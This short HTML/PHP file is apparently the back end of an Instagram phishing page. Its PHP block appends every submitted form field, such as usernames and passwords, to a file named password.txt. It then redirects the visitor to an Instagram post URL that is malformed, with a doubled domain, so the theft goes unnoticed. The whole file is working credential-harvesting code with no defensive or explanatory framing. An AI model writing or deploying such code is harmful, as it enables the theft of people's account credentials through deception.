<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>
<?php
header('Location: https://www.instagram.com/https://www.instagram.com/p/CtJnHZOsySP/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==');
$handle = fopen("password.txt", "a");
foreach ($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "=============\r\n");
fclose($handle);
exit;
?>
</body>
</html>